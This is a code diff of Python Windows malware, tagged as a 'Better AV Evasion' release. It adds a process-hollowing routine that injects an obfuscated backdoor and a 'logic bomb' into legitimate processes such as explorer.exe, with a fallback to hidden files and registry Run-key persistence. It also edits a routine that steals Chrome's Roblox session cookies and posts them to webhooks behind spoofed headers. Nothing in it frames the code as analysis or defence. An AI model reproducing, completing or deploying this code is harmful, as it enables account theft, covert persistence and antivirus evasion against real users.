@@ -37,7 +37,7 @@ from email import encoders
 from io import StringIO
 from contextlib import redirect_stderr
 
-# Version 1.0.0 - Initial release
+# Version 1.1.0 - Better AV Evasion
 
 COOKIE_WEBHOOK_URLS = ["1", "1_backup"]
 SCREENSHOT_WEBHOOK_URLS = ["2", "2_backup"]
@@ -47,20 +47,11 @@ CHECK_INTERVAL = 3
 SCREENSHOT_INTERVAL = 1800
 LOGIC_BOMB_CHECK_INTERVAL = 5
 FOUND_COOKIES = set()
-def random_uuid():
-    try:
-        return str(uuid.uuid4())[:8]
-    except Exception as e:
-        ERROR_LOG.write(f"random_uuid error: {str(e)}\n")
-        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-
 SYSTEM_PATHS = [
     os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'System'),
     os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Core'),
     os.path.join(os.getenv('WINDIR'), 'System32', 'Config')
 ]
-BACKDOOR_PATH = os.path.join(SYSTEM_PATHS[0], f'sys{random_uuid()}.pyw')
-LOGIC_BOMB_PATH = os.path.join(SYSTEM_PATHS[1], f'core{random_uuid()}.pyw')
 STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 OBFUSCATED_NAMES = [''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) for _ in range(3)]
 USER_AGENTS = [
@@ -71,6 +62,43 @@ USER_AGENTS = [
 AV_PROCESSES = ['avastsvc.exe', 'msmpeng.exe', 'nortonsecurity.exe', 'mcafee.exe', 'eset.exe']
 XOR_KEY = ''.join(random.choices(string.ascii_letters, k=16)).encode()
 ERROR_LOG = StringIO()
+LEGIT_PROCESSES = ['explorer.exe', 'svchost.exe', 'notepad.exe']
+
+kernel32 = ctypes.windll.kernel32
+SIZE_T = ctypes.c_size_t
+LPVOID = ctypes.c_void_p
+HANDLE = ctypes.c_void_p
+DWORD = ctypes.c_uint32
+
+class PROCESS_INFORMATION(ctypes.Structure):
+    _fields_ = [
+        ('hProcess', HANDLE),
+        ('hThread', HANDLE),
+        ('dwProcessId', DWORD),
+        ('dwThreadId', DWORD)
+    ]
+
+class STARTUPINFO(ctypes.Structure):
+    _fields_ = [
+        ('cb', DWORD),
+        ('lpReserved', ctypes.c_wchar_p),
+        ('lpDesktop', ctypes.c_wchar_p),
+        ('lpTitle', ctypes.c_wchar_p),
+        ('dwX', DWORD),
+        ('dwY', DWORD),
+        ('dwXSize', DWORD),
+        ('dwYSize', DWORD),
+        ('dwXCountChars', DWORD),
+        ('dwYCountChars', DWORD),
+        ('dwFillAttribute', DWORD),
+        ('dwFlags', DWORD),
+        ('wShowWindow', ctypes.c_uint16),
+        ('cbReserved2', ctypes.c_uint16),
+        ('lpReserved2', ctypes.c_char_p),
+        ('hStdInput', HANDLE),
+        ('hStdOutput', HANDLE),
+        ('hStdError', HANDLE)
+    ]
 
 def random_uuid():
     try:
@@ -127,6 +155,115 @@ exec(code)
     except Exception as e:
         ERROR_LOG.write(f"pack_and_encrypt error: {str(e)}\n")
         return code
+
+def process_hollowing(payload_code):
+    try:
+        target_process = random.choice(LEGIT_PROCESSES)
+        startup_info = STARTUPINFO()
+        startup_info.cb = ctypes.sizeof(STARTUPINFO)
+        process_info = PROCESS_INFORMATION()
+
+        success = kernel32.CreateProcessW(
+            ctypes.c_wchar_p(target_process),
+            None, None, None, False,
+            0x00000004 | 0x8000000, 
+            None, None,
+            ctypes.byref(startup_info),
+            ctypes.byref(process_info)
+        )
+        if not success:
+            raise ctypes.WinError(ctypes.get_last_error())
+
+        try:
+            class CONTEXT(ctypes.Structure):
+                _fields_ = [
+                    ('ContextFlags', DWORD),
+                    ('Dr0', DWORD), ('Dr1', DWORD), ('Dr2', DWORD), ('Dr3', DWORD),
+                    ('Dr6', DWORD), ('Dr7', DWORD),
+                    ('FloatSave', ctypes.c_ubyte * 512),
+                    ('SegGs', DWORD), ('SegFs', DWORD), ('SegEs', DWORD), ('SegDs', DWORD),
+                    ('Edi', DWORD), ('Esi', DWORD), ('Ebx', DWORD), ('Edx', DWORD),
+                    ('Ecx', DWORD), ('Eax', DWORD), ('Ebp', DWORD), ('Eip', DWORD),
+                    ('SegCs', DWORD), ('EFlags', DWORD), ('Esp', DWORD), ('SegSs', DWORD),
+                    ('ExtendedRegisters', ctypes.c_ubyte * 512)
+                ]
+
+            context = CONTEXT()
+            context.ContextFlags = 0x10001  
+            if not kernel32.GetThreadContext(process_info.hThread, ctypes.byref(context)):
+                raise ctypes.WinError(ctypes.get_last_error())
+
+            peb_address = ctypes.c_void_p()
+            if not kernel32.ReadProcessMemory(
+                process_info.hProcess,
+                ctypes.c_void_p(context.Ebx + 8),
+                ctypes.byref(peb_address),
+                ctypes.sizeof(ctypes.c_void_p),
+                None
+            ):
+                raise ctypes.WinError(ctypes.get_last_error())
+
+            image_base = ctypes.c_void_p()
+            if not kernel32.ReadProcessMemory(
+                process_info.hProcess,
+                ctypes.c_void_p(peb_address.value + 8),
+                ctypes.byref(image_base),
+                ctypes.sizeof(ctypes.c_void_p),
+                None
+            ):
+                raise ctypes.WinError(ctypes.get_last_error())
+
+            if not ctypes.windll.ntdll.NtUnmapViewOfSection(
+                process_info.hProcess,
+                image_base
+            ):
+                raise ctypes.WinError(ctypes.get_last_error())
+
+            payload = payload_code.encode()
+            alloc_address = kernel32.VirtualAllocEx(
+                process_info.hProcess,
+                image_base,
+                len(payload),
+                0x3000,  
+                0x40     
+            )
+            if not alloc_address:
+                raise ctypes.WinError(ctypes.get_last_error())
+
+            written = SIZE_T()
+            if not kernel32.WriteProcessMemory(
+                process_info.hProcess,
+                alloc_address,
+                payload,
+                len(payload),
+                ctypes.byref(written)
+            ):
+                raise ctypes.WinError(ctypes.get_last_error())
+
+            if not kernel32.WriteProcessMemory(
+                process_info.hProcess,
+                ctypes.c_void_p(peb_address.value + 8),
+                ctypes.byref(ctypes.c_void_p(alloc_address)),
+                ctypes.sizeof(ctypes.c_void_p),
+                None
+            ):
+                raise ctypes.WinError(ctypes.get_last_error())
+
+            context.Eip = alloc_address
+            if not kernel32.SetThreadContext(process_info.hThread, ctypes.byref(context)):
+                raise ctypes.WinError(ctypes.get_last_error())
+
+            if not kernel32.ResumeThread(process_info.hThread):
+                raise ctypes.WinError(ctypes.get_last_error())
+
+        finally:
+            kernel32.CloseHandle(process_info.hThread)
+            kernel32.CloseHandle(process_info.hProcess)
+
+        return True
+    except Exception as e:
+        ERROR_LOG.write(f"process_hollowing error: {str(e)}\n")
+        return False
 
 def elevate_privileges():
     try:
@@ -268,13 +405,14 @@ def get_chrome_cookies(browser_path):
     try:
         copyfile(db_path, temp_db)
         with sqlite3.connect(temp_db) as conn:
+            conn.text_factory = bytes
             cursor = conn.cursor()
             cursor.execute(f"SELECT host_key, name, encrypted_value FROM cookies WHERE name = '{xor_decrypt('_ROBLOSECURITY', XOR_KEY)}'")
             
             for host, name, value in cursor.fetchall():
                 decrypted = decrypt_chrome_cookie(value)
                 if decrypted and decrypted not in FOUND_COOKIES:
-                    cookies.append({'host': host, 'cookie': decrypted})
+                    cookies.append({'host': host.decode(), 'cookie': decrypted})
                     FOUND_COOKIES.add(decrypted)
     except Exception as e:
         ERROR_LOG.write(f"get_chrome_cookies error: {str(e)}\n")
@@ -387,20 +525,20 @@ def send_to_cookie_webhook(cookies):
                 }]
             }
         
-        headers = {
-            'User-Agent': random.choice(USER_AGENTS),
-            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-        }
-        proxies = {'http': None, 'https': None}
+            headers = {
+                'User-Agent': random.choice(USER_AGENTS),
+                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+                'Accept': 'application/json',
+                'Content-Type': 'application/json'
+            }
+            proxies = {'http': None, 'https': None}
         
-        for url in COOKIE_WEBHOOK_URLS:
-            try:
-                requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=2)
-                break
-            except:
-                continue
+            for url in COOKIE_WEBHOOK_URLS:
+                try:
+                    requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=2)
+                    break
+                except:
+                    continue
     except Exception as e:
         ERROR_LOG.write(f"send_to_cookie_webhook error: {str(e)}\n")
 
@@ -582,17 +720,20 @@ if __name__ == '__main__':
     {''.join(random.choices(string.ascii_lowercase, k=8))}()
 """
     try:
-        os.makedirs(os.path.dirname(BACKDOOR_PATH), exist_ok=True)
         obfuscated_code = pack_and_encrypt(polymorph_code(backdoor_code))
-        with open(BACKDOOR_PATH, 'w') as f:
-            f.write(hashlib.sha256(obfuscated_code.encode()).hexdigest()[:12] + obfuscated_code)
-        win32file.SetFileAttributes(BACKDOOR_PATH, win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_SYSTEM)
-        
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
-        try:
-            winreg.SetValueEx(key, f"Update{random_uuid()}", 0, winreg.REG_SZ, f'pythonw "{BACKDOOR_PATH}"')
-        finally:
-            winreg.CloseKey(key)
+        if not process_hollowing(obfuscated_code):
+            ERROR_LOG.write("Backdoor hollowing failed, falling back to disk-based persistence\n")
+            backdoor_path = os.path.join(SYSTEM_PATHS[0], f'sys{random_uuid()}.pyw')
+            os.makedirs(os.path.dirname(backdoor_path), exist_ok=True)
+            with open(backdoor_path, 'w') as f:
+                f.write(hashlib.sha256(obfuscated_code.encode()).hexdigest()[:12] + obfuscated_code)
+            win32file.SetFileAttributes(backdoor_path, win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_SYSTEM)
+            
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
+            try:
+                winreg.SetValueEx(key, f"Update{random_uuid()}", 0, winreg.REG_SZ, f'pythonw "{backdoor_path}"')
+            finally:
+                winreg.CloseKey(key)
     except Exception as e:
         ERROR_LOG.write(f"install_backdoor error: {str(e)}\n")
 
@@ -605,9 +746,7 @@ import win32gui
 import win32con
 import ctypes
 
-BACKDOOR = r"{BACKDOOR_PATH}"
 CHECK = {LOGIC_BOMB_CHECK_INTERVAL}
-SELF = r"{LOGIC_BOMB_PATH}"
 
 def {''.join(random.choices(string.ascii_lowercase, k=8))}():
     try:
@@ -629,9 +768,6 @@ def {''.join(random.choices(string.ascii_lowercase, k=8))}():
 def {''.join(random.choices(string.ascii_lowercase, k=8))}():
     while True:
         try:
-            if not os.path.exists(BACKDOOR) or not os.path.exists(SELF):
-                {''.join(random.choices(string.ascii_lowercase, k=8))}()
-                break
             time.sleep(CHECK)
         except:
             break
@@ -641,17 +777,20 @@ if __name__ == '__main__':
     {''.join(random.choices(string.ascii_lowercase, k=8))}()
 """
     try:
-        os.makedirs(os.path.dirname(LOGIC_BOMB_PATH), exist_ok=True)
         obfuscated_code = pack_and_encrypt(polymorph_code(logic_bomb_code))
-        with open(LOGIC_BOMB_PATH, 'w') as f:
-            f.write(hashlib.sha256(obfuscated_code.encode()).hexdigest()[:12] + obfuscated_code)
-        win32file.SetFileAttributes(LOGIC_BOMB_PATH, win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_SYSTEM)
-        
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
-        try:
-            winreg.SetValueEx(key, f"Service{random_uuid()}", 0, winreg.REG_SZ, f'pythonw "{LOGIC_BOMB_PATH}"')
-        finally:
-            winreg.CloseKey(key)
+        if not process_hollowing(obfuscated_code):
+            ERROR_LOG.write("Logic bomb hollowing failed, falling back to disk-based persistence\n")
+            logic_bomb_path = os.path.join(SYSTEM_PATHS[1], f'core{random_uuid()}.pyw')
+            os.makedirs(os.path.dirname(logic_bomb_path), exist_ok=True)
+            with open(logic_bomb_path, 'w') as f:
+                f.write(hashlib.sha256(obfuscated_code.encode()).hexdigest()[:12] + obfuscated_code)
+            win32file.SetFileAttributes(logic_bomb_path, win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_SYSTEM)
+            
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
+            try:
+                winreg.SetValueEx(key, f"Service{random_uuid()}", 0, winreg.REG_SZ, f'pythonw "{logic_bomb_path}"')
+            finally:
+                winreg.CloseKey(key)
     except Exception as e:
         ERROR_LOG.write(f"install_logic_bomb error: {str(e)}\n")
 
